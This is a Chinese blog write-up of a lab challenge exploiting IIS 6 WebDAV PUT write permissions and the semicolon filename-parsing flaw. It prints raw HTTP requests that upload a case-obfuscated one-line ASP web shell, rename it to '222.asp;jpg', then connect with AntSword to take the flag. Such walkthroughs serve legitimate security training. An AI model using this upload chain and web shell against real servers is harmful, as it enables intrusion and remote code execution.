---
title: 题目2-IIS写权限漏洞分析溯源
description: iis put写权限漏洞、iis6文件名解析漏洞
tags:
  - 题目
  - 墨者学院
  - iis
categories:
  - - 安全
    - 安全题目
abbrlink: 3128432425
date: 2020-10-19 15:48:29
---
墨者学院一道题目-IIS写权限漏洞分析溯源  
[题目链接](https://www.mozhe.cn/bug/detail/VnRjUTVETHFXWk5URWNjV2VpVWhRQT09bW96aGUmozhe?tdsourcetag=s_pcqq_aiomsg)    

知识点：  
1.[iis put写权限漏洞](https://www.cnblogs.com/tdcqma/p/6125789.html)   
2.[iis6文件名解析漏洞](https://www.cnblogs.com/hack747/p/12271048.html)   

工具：
burpsuite    
[Antsword](https://github.com/AntSwordProject/antSword)[AntSword-Loader](https://github.com/AntSwordProject/AntSword-Loader)    

---

IP地址 : 219.153.49.228 端口 : 48336 协议 : http 其他 : [点击访问]  

1.直接访问靶场，并使用burpsuite抓包  
http://219.153.49.228:48336  
显示页面：  
![](https://raw.githubusercontent.com/tea9/image/master/blog_img/36/02.png)
原始包：  
![](https://raw.githubusercontent.com/tea9/image/master/blog_img/36/01.png)

2.利用iis写权限漏洞 使用PUT上传文件txt  
用OPTIONS，观察返回，Allow存在PUT
请求包：  

```
OPTIONS / HTTP/1.1
Host: 219.153.49.228:48336
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cacheOPTIONS


```

响应包：  
```
HTTP/1.1 200 OK
Connection: close
Date: Mon, 19 Oct 2020 07:41:00 GMT
Server: Microsoft-IIS/6.0
MS-Author-Via: DAV
Content-Length: 0
Accept-Ranges: none
DASL: <DAV:sql>
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Cache-Control: private


```

利用iisput写权限漏洞

```
PUT /a.txt HTTP/1.1
Host: 219.153.49.228:48336
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 24

<%exECuTe ReqUEst(0)%>

```

```
HTTP/1.1 201 Created
Connection: close
Date: Mon, 19 Oct 2020 07:35:54 GMT
Server: Microsoft-IIS/6.0
Location: http://219.153.49.228/a.txt
Content-Length: 0
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK


```
成功写入  

3.MOVE修改文件名（利用iis解析漏洞）

Destination:/222.asp;jpg  

```
MOVE /a.txt HTTP/1.1
Host: 219.153.49.228:48336
Destination:/222.asp;jpg
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 2



```

```
HTTP/1.1 207 Multi-Status
Connection: close
Date: Mon, 19 Oct 2020 07:37:17 GMT
Server: Microsoft-IIS/6.0
Location: http://219.153.49.228/222.asp;jpg
Content-Type: text/xml
Content-Length: 182

<?xml version="1.0"?><a:multistatus xmlns:a="DAV:"><a:response><a:href>http://219.153.49.228/a.txt</a:href><a:status>HTTP/1.1 401 Unauthorized</a:status></a:response></a:multistatus>
```

4.使用Antsword链接
http://219.153.49.228:48336/222.asp;jpg  
0  
![](https://raw.githubusercontent.com/tea9/image/master/blog_img/36/03.png)
![](https://raw.githubusercontent.com/tea9/image/master/blog_img/36/04.png)
![](https://raw.githubusercontent.com/tea9/image/master/blog_img/36/05.png)

```
/* 
mozhe4a24a1cb68810f620c473728805
*/ 
```

